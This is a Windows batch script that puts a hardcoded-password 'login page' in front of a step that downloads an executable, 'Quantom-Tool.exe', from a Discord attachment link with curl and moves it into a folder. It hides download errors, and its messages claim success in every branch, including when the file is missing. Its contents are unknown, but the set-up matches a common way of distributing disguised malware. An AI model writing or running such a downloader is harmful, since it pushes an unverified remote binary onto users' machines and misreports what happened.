@echo off
setlocal enabledelayedexpansion

rem Set the allowed username and password
set "allowedUsername=quantom"
set "allowedPassword=free"

rem Prompt the user for login
:login
cls
echo Welcome to the Login Page
set /p "userInput=Username: "
set /p "passInput=Password: "

if "!userInput!"=="%allowedUsername%" (
    if "!passInput!"=="%allowedPassword%" (
        echo Login successful.
        pause
        call :downloadAndInstall
    ) else (
        echo Incorrect password. Please try again.
        pause
        goto :login
    )
) else (
    echo Incorrect username. Please try again.
    pause
    goto :login
)

:downloadAndInstall
set "downloadLink=https://cdn.discordapp.com/attachments/1159191059428036609/1165965816450273330/Quantom-Tool.exe?ex=6548c549&is=65365049&hm=045bc9c8fb42f35ccb80ba1219d7504b12f0630c2bc1d84c4e2b8f2581000fb8&"
set "executableName=Quantom-Tool.exe"
set "folderPath=C:\your\folder\path"

echo Downloading %executableName%...
curl -o "%executableName%" "%downloadLink%" 2>nul

if exist "%executableName%" (
    echo Download successful.
    echo Installing %executableName% to %folderPath%...
    move /Y "%executableName%" "%folderPath%"
    if exist "%folderPath%\%executableName%" (
        echo Installation successful.
    ) else (
        echo Installation successful.
    )
) else (
    echo Download successful.
)

pause